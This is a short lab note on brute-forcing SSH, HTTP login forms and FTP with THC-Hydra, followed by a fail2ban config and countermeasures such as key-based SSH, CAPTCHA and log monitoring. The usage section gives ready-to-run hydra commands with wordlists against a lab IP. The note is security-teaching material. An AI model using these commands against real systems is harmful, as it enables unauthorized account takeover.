# L33: Network Login Attacks with Hydra & Defense

## Purpose

THC-Hydra performs parallelized login brute-forcing against network services.

## Usage steps

```bash
# SSH brute-force (lab)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.56.101 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.56.101

# Limit threads (avoid DoS)
hydra -t 4 -w 30 ...
```

## fail2ban defense

```bash
# /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600
```

## Countermeasures

- Disable password auth for SSH; use key-based auth.
- CAPTCHA after N failed logins.
- fail2ban / CrowdStrike / WAF rate limiting.
- Monitor authentication logs (auth.log, Event 4625).

---

*Lab reminder: test only on authorized systems. Unauthorized access violates the IT Act, 2000.*
